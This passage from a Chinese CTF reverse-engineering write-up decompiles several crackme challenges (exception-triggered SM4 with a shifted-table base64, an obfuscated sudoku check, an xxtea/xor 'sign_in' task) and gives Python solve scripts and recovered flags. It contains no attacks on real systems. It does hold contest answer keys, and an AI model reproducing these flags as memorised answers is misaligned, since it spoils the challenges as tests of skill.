class="number">0xC0000005</span> )           <span class="comment">// 异常</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="built_in">j_strlen</span>(Str2); i += <span class="number">2</span> )   <span class="comment">// 相邻swap</span></span><br><span class="line">    &#123;</span><br><span class="line">      v2 = Str2[i];</span><br><span class="line">      Str2[i] = Str2[i + <span class="number">1</span>];</span><br><span class="line">      Str2[i + <span class="number">1</span>] = v2;</span><br><span class="line">    &#125;</span><br><span class="line">    Str1 = <span class="built_in">j_BASE64ENCODE</span>(byte_50A180);</span><br><span class="line">    *(_DWORD *)(a1[<span class="number">1</span>] + <span class="number">176</span>) = *(_DWORD *)(*a1 + <span class="number">20</span>);</span><br><span class="line">    *(_DWORD *)(a1[<span class="number">1</span>] + <span class="number">164</span>) = *(_DWORD *)(*a1 + <span class="number">24</span>);</span><br><span class="line">    *(_DWORD *)(a1[<span class="number">1</span>] + <span class="number">172</span>) = *(_DWORD *)(*a1 + <span class="number">28</span>);</span><br><span class="line">    *(_DWORD *)(a1[<span class="number">1</span>] + <span class="number">168</span>) = *(_DWORD *)(*a1 + <span class="number">32</span>);</span><br><span class="line">    *(_DWORD *)(a1[<span class="number">1</span>] + <span class="number">156</span>) = *(_DWORD *)(*a1 + <span class="number">36</span>);</span><br><span class="line">    *(_DWORD *)(a1[<span class="number">1</span>] + <span class="number">160</span>) = *(_DWORD *)(*a1 + <span class="number">40</span>);</span><br><span class="line">    *(_DWORD *)(a1[<span class="number">1</span>] + <span class="number">184</span>) = j_FINAL_CHECK;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里对Str2进行了两个一组的相邻swap<br>同时对byte_50A180进行了base64加密<br>查看base64加密函数</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">_BYTE *__cdecl <span class="title">BASE64ENCODE</span><span class="params">(<span class="type">char</span> *Str)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> k; <span class="comment">// [esp+E4h] [ebp-5Ch]</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [esp+F0h] [ebp-50h]</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [esp+FCh] [ebp-44h]</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [esp+108h] [ebp-38h]</span></span><br><span class="line">  <span class="type">signed</span> <span class="type">int</span> i; <span class="comment">// [esp+114h] [ebp-2Ch]</span></span><br><span class="line">  _BYTE *v7; <span class="comment">// [esp+120h] [ebp-20h]</span></span><br><span class="line">  <span class="type">signed</span> <span class="type">int</span> v8; <span class="comment">// [esp+12Ch] [ebp-14h]</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// [esp+138h] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = <span class="number">0</span>;</span><br><span class="line">  v8 = <span class="built_in">j_strlen</span>(Str);</span><br><span class="line">  <span class="keyword">if</span> ( v8 % <span class="number">3</span> )</span><br><span class="line">    v9 = <span class="number">4</span> * (v8 / <span class="number">3</span>) + <span class="number">4</span>;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    v9 = <span class="number">4</span> * (v8 / <span class="number">3</span>);</span><br><span class="line">  v7 = <span class="built_in">malloc</span>(__CFADD__(v9, <span class="number">1</span>) ? <span class="number">-1</span> : v9 + <span class="number">1</span>);</span><br><span class="line">  v7[v9] = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v8; i += <span class="number">3</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; <span class="number">3</span>; ++j )</span><br><span class="line">      v3 |= (<span class="type">unsigned</span> __int8)Str[j + i] &lt;&lt; (<span class="number">8</span> * (<span class="number">2</span> - j));</span><br><span class="line">    <span class="keyword">for</span> ( k = <span class="number">0</span>; k &lt; <span class="number">4</span>; ++k )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( k &gt;= <span class="number">4</span> - (i + <span class="number">3</span> - v8) &amp;&amp; i + <span class="number">3</span> &gt; v8 )</span><br><span class="line">        v7[v5] = <span class="string">&#x27;!&#x27;</span>;                           <span class="comment">// 把&quot;=&quot;填充改为&quot;!&quot;了</span></span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        v7[v5] = BASE64_table_41A080[<span class="built_in">sub_5010FF</span>((v3 &gt;&gt; (<span class="number">6</span> * (<span class="number">3</span> - k))) &amp; <span class="number">0x3F</span>)];<span class="comment">// 这里变了！！！！！！！！！</span></span><br><span class="line">                                                <span class="comment">// (a1 + 24) % 64;</span></span><br><span class="line">                                                <span class="comment">// 所以等价于再把base64表移动24位...</span></span><br><span class="line">      ++v5;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v7;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我第一遍看以为它只是把填充字符改了<br>后面一直解的不对劲 再细看才发现这个sub_5010FF！</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> (a1 + <span class="number">24</span>) % <span class="number">64</span>;</span><br></pre></td></tr></table></figure><p>所以相当于把base64的table整体向左移了24位<br>所以变表应该为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/abcdefghijklmnopqrstuvwx</span><br></pre></td></tr></table></figure><p>回到sub_502C30<br>base64加密完后有个check</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> __noreturn <span class="title">FINAL_CHECK</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">j_strcmp</span>(Str1, Str2) )</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;right\n&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;wrong\n&quot;</span>);</span><br><span class="line">  <span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将base64加密的Str1和变换后的Str2比对</p><p>回溯一下 看这里:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Str1 = <span class="built_in">j_BASE64ENCODE</span>(byte_50A180);</span><br></pre></td></tr></table></figure><p>查看byte_50A180的交叉引用</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __cdecl <span class="title">sub_502EA0</span><span class="params">(_DWORD *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> ( *a1 == <span class="number">0xC0000005</span> )                      <span class="comment">// 异常处理</span></span><br><span class="line">    <span class="built_in">sub_501131</span>((<span class="type">int</span>)&amp;unk_50A218, <span class="number">1</span>, <span class="number">16</span>, (<span class="type">int</span>)&amp;INPUT, (<span class="type">int</span>)byte_50A180);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里跟进去发现是SM4的主体部分 前面的那个具有SM4特征的应该是init函数<br>那么流程就清楚了<br>输入-&gt;hook(变表+设置异常处理)-&gt;触发异常-&gt;SM4-&gt;魔改base64-&gt;check<br>那么我们把Str2 swap   base64table 处理好<br>逆回去解就可以了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Str2: U1ATIOpkOyWSvGm/YOYFR4==</span><br><span class="line">table: yzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/abcdefghijklmnopqrstuvwx</span><br></pre></td></tr></table></figure><p>base64逆回去得到:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">59d095290df2400614f48d276906874e</span><br></pre></td></tr></table></figure><p>SM4 以where_are_u_now?为key逆回去 得到</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SM4foRExcepioN?!</span><br></pre></td></tr></table></figure><p><strong>flag{SM4foRExcepioN?!}</strong></p><hr><hr><p>总结 每个函数都点一点… <del>怎么就把那个移24位的函数看漏了呢…</del></p><h2 id="Game"><a href="#Game" class="headerlink" title="Game"></a>Game</h2><p>用插件去除ollvm混淆 控制流平坦化后<br>main</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v4; <span class="comment">// [rsp+30h] [rbp-50h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v5; <span class="comment">// [rsp+38h] [rbp-48h]</span></span><br><span class="line">  <span class="type">char</span> v6[<span class="number">56</span>]; <span class="comment">// [rsp+40h] [rbp-40h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// [rsp+78h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v7 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;input your flag:&quot;</span>);</span><br><span class="line">  <span class="built_in">gets</span>(v6, argv);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)<span class="built_in">general_inspection</span>((<span class="built_in">int</span> (*)[<span class="number">9</span>])sudoku) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">    <span class="built_in">check</span>((<span class="built_in">int</span> (*)[<span class="number">9</span>])sudoku);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v5 = <span class="built_in">blank_num</span>((<span class="built_in">int</span> (*)[<span class="number">9</span>])sudoku);</span><br><span class="line">    v4 = <span class="built_in">mem_alloc</span>(v5);</span><br><span class="line">    <span class="built_in">trace</span>(sudoku, v4, v5);</span><br><span class="line">    <span class="built_in">check</span>((<span class="built_in">int</span> (*)[<span class="number">9</span>])sudoku);</span><br><span class="line">    <span class="built_in">check1</span>(v6);                                 <span class="comment">// 对输入作了变换</span></span><br><span class="line">    <span class="built_in">check3</span>(v6);                                 <span class="comment">// 解一个数独</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>根据check3里面的解出数独得到我们变换后的输入为</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">4693641762894685722843556137219876255986</span></span><br></pre></td></tr></table></figure><p>看check1</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">check1</span><span class="params">(<span class="type">char</span> *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">char</span> v2; <span class="comment">// [rsp+6Eh] [rbp-12h]</span></span><br><span class="line">  <span class="type">char</span> v3; <span class="comment">// [rsp+6Fh] [rbp-11h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+70h] [rbp-10h]</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [rsp+74h] [rbp-Ch]</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [rsp+74h] [rbp-Ch]</span></span><br><span class="line">  <span class="type">int</span> k; <span class="comment">// [rsp+74h] [rbp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v5 = <span class="built_in">strlen</span>(a1) &gt;&gt; <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(a1) &gt;&gt; <span class="number">1</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = a1[v5];</span><br><span class="line">    a1[v5] = a1[i];</span><br><span class="line">    a1[i] = v3;</span><br><span class="line">    ++v5;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; <span class="built_in">strlen</span>(a1); j += <span class="number">2</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v2 = a1[j];</span><br><span class="line">    a1[j] = a1[j + <span class="number">1</span>];</span><br><span class="line">    a1[j + <span class="number">1</span>] = v2;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> ( k = <span class="number">0</span>; k &lt; <span class="built_in">strlen</span>(a1); ++k )</span><br><span class="line">    a1[k] = -(a1[k] ^ <span class="number">0xF3</span>) - <span class="number">21</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>跟着逆回去就好</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">flag = <span class="string">&quot;4693641762894685722843556137219876255986&quot;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(flag))</span><br><span class="line">flag = <span class="built_in">list</span>(flag)</span><br><span class="line">flag = [<span class="built_in">ord</span>(x) <span class="keyword">for</span> x <span class="keyword">in</span> flag]</span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag)):</span><br><span class="line">    flag[k] = -(flag[k]+<span class="number">21</span>)^<span class="number">0xf3</span></span><br><span class="line">    flag[k] &amp;= <span class="number">0xff</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(flag),<span class="number">2</span>):</span><br><span class="line">    tmp = flag[j]</span><br><span class="line">    flag[j] = flag[j+<span class="number">1</span>]</span><br><span class="line">    flag[j+<span class="number">1</span>] = tmp</span><br><span class="line">v5 = <span class="number">40</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">19</span>,-<span class="number">1</span>,-<span class="number">1</span>):</span><br><span class="line">    v5 -= <span class="number">1</span></span><br><span class="line">    v3 = flag[v5]</span><br><span class="line">    flag[v5] = flag[i]</span><br><span class="line">    flag[i] = v3</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> flag:</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(i),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># KDEEIFGKIJ@AFGEJAEF@FDKADFGIJFA@FDE@JG@J</span></span><br></pre></td></tr></table></figure><p><strong>flag{KDEEIFGKIJ@AFGEJAEF@FDKADFGIJFA@FDE@JG@J}</strong></p><h1 id="安洵杯2021"><a href="#安洵杯2021" class="headerlink" title="安洵杯2021"></a>安洵杯2021</h1><h2 id="sign-in"><a href="#sign-in" class="headerlink" title="sign_in"></a>sign_in</h2><p>IDA捣鼓半天 一大堆未识别的麻烦死了<br>直接od跑一跑 dump出来看 清晰多了</p><p>根据关键字符串找到加密函数:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">sub_401D10</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _BYTE v1[<span class="number">125</span>]; <span class="comment">// [esp+4Ch] [ebp-140h] BYREF</span></span><br><span class="line">  __int16 v2; <span class="comment">// [esp+C9h] [ebp-C3h]</span></span><br><span class="line">  <span class="type">char</span> v3; <span class="comment">// [esp+CBh] [ebp-C1h]</span></span><br><span class="line">  <span class="type">int</span> v4[<span class="number">4</span>]; <span class="comment">// [esp+CCh] [ebp-C0h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v5[<span class="number">32</span>]; <span class="comment">// [esp+DCh] [ebp-B0h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v6[<span class="number">36</span>]; <span class="comment">// [esp+15Ch] [ebp-30h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// [esp+180h] [ebp-Ch]</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [esp+184h] [ebp-8h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [esp+188h] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  v7 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(v5, <span class="number">0</span>, <span class="built_in">sizeof</span>(v5));</span><br><span class="line">  v4[<span class="number">0</span>] = <span class="number">68</span>;</span><br><span class="line">  v4[<span class="number">1</span>] = <span class="number">48</span>;</span><br><span class="line">  v4[<span class="number">2</span>] = <span class="number">103</span>;</span><br><span class="line">  v4[<span class="number">3</span>] = <span class="number">51</span>;</span><br><span class="line">  <span class="built_in">memset</span>(v1, <span class="number">0</span>, <span class="built_in">sizeof</span>(v1));</span><br><span class="line">  v2 = <span class="number">0</span>;</span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">sub_402200</span>(<span class="string">&quot;Now please input your flag:&quot;</span>);</span><br><span class="line">  <span class="built_in">sub_4023D0</span>(<span class="string">&quot;%s&quot;</span>, v6);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">32</span>; ++i )</span><br><span class="line">    v6[i] ^= v6[(i + <span class="number">1</span>) % <span class="number">32</span>];</span><br><span class="line">  i = <span class="number">0</span>;</span><br><span class="line">  j = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( i &lt; <span class="number">32</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( j % <span class="number">6</span> &gt;= <span class="number">3</span> )</span><br><span class="line">      v1[<span class="number">32</span> * (<span class="number">3</span> - j % <span class="number">3</span>) + i] = v6[i];</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      v1[<span class="number">32</span> * (j % <span class="number">3</span>) + i] = v6[i];</span><br><span class="line">    ++i;</span><br><span class="line">    ++j;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">4</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; <span class="number">32</span>; ++j )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v1[<span class="number">32</span> * i + j] )</span><br><span class="line">        v5[v7++] = (<span class="type">unsigned</span> __int8)v1[<span class="number">32</span> * i + j];</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">sub_401055</span>(v5, v4, <span class="number">32</span>);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">sub_40105F</span>(v5) )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">sub_402200</span>(<span class="string">&quot;congratulations !!!&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">sub_402200</span>(<span class="string">&quot;sorry , you&#x27;re wrong&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>xxtea部分:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">_DWORD *__cdecl <span class="title">sub_401AE0</span><span class="params">(_DWORD *a1, <span class="type">int</span> a2, <span class="type">unsigned</span> <span class="type">int</span> a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _DWORD *result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> i; <span class="comment">// [esp+4Ch] [ebp-1Ch]</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [esp+50h] [ebp-18h]</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [esp+54h] [ebp-14h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v7; <span class="comment">// [esp+58h] [ebp-10h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v8; <span class="comment">// [esp+5Ch] [ebp-Ch]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v9; <span class="comment">// [esp+60h] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = dword_42CA44 + <span class="number">1144219440</span>;</span><br><span class="line">  v7 = <span class="number">0x34</span> / a3 + <span class="number">6</span>;</span><br><span class="line">  v8 = <span class="number">0</span>;</span><br><span class="line">  v9 = a1[a3 - <span class="number">1</span>];</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    v8 += v5;</span><br><span class="line">    v6 = (v8 &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; a3 - <span class="number">1</span>; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      a1[i] += ((v9 ^ *(_DWORD *)(a2 + <span class="number">4</span> * (v6 ^ i &amp; <span class="number">3</span>))) + (a1[i + <span class="number">1</span>] ^ v8)) ^ (((<span class="number">16</span> * v9) ^ (a1[i + <span class="number">1</span>] &gt;&gt; <span class="number">3</span>))</span><br><span class="line">                                                                               + ((<span class="number">4</span> * a1[i + <span class="number">1</span>]) ^ (v9 &gt;&gt; <span class="number">5</span>)));</span><br><span class="line">      v9 = a1[i];</span><br><span class="line">    &#125;</span><br><span class="line">    a1[a3 - <span class="number">1</span>] += ((v9 ^ *(_DWORD *)(a2 + <span class="number">4</span> * (v6 ^ i &amp; <span class="number">3</span>))) + (*a1 ^ v8)) ^ (((<span class="number">16</span> * v9) ^ (*a1 &gt;&gt; <span class="number">3</span>))</span><br><span class="line">                                                                            + ((<span class="number">4</span> * *a1) ^ (v9 &gt;&gt; <span class="number">5</span>)));</span><br><span class="line">    result = a1;</span><br><span class="line">    v9 = a1[a3 - <span class="number">1</span>];</span><br><span class="line">    --v7;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v7 );</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里dword_42CA44不知道 但是我们可以爆破<br>利用xxtea解密后是unsigned int8 来约束 爆破得到 77<br>再解一个xor</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">enc = [<span class="number">60</span>,<span class="number">64</span>,<span class="number">43</span>,<span class="number">102</span>,<span class="number">111</span>,<span class="number">79</span>,<span class="number">92</span>,<span class="number">29</span>,<span class="number">66</span>,<span class="number">26</span>,<span class="number">43</span>,<span class="number">87</span>,<span class="number">54</span>,<span class="number">68</span>,<span class="number">51</span>,<span class="number">28</span>,<span class="number">29</span>,<span class="number">107</span>,<span class="number">92</span>,<span class="number">6</span>,<span class="number">15</span>,<span class="number">28</span>,<span class="number">92</span>,<span class="number">26</span>,<span class="number">43</span>,<span class="number">9</span>,<span class="number">50</span>,<span class="number">110</span>,<span class="number">21</span>,<span class="number">90</span>,<span class="number">44</span>,<span class="number">37</span>]</span><br><span class="line">i = <span class="number">0</span></span><br><span class="line">j = <span class="number">0</span></span><br><span class="line">v1 = [<span class="number">0</span>]*<span class="number">128</span></span><br><span class="line"><span class="keyword">while</span> i&lt;<span class="number">32</span>:</span><br><span class="line">    <span class="keyword">if</span> j%<span class="number">6</span>&gt;=<span class="number">3</span>:</span><br><span class="line">        v1[<span class="number">32</span>*(<span class="number">3</span>-(j%<span class="number">3</span>))+i] = i+<span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        v1[<span 